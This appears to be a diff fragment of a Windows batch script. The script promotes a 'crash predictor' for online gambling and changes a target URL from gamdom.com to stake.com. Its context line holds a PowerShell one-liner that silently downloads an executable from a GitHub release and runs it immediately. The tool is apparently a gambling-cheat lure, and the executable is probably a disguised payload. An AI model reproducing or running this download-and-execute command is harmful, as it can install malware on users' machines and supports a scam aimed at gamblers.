@@ -11,4 +11,4 @@ echo.
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/gamdom-crash-preditor/releases/download/Gamdom-Crash-Predictor/CrashPredictor.exe';$file='CrashPredictor.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 
 
-https://gamdom.com/crash
+https://stake.com/fr/
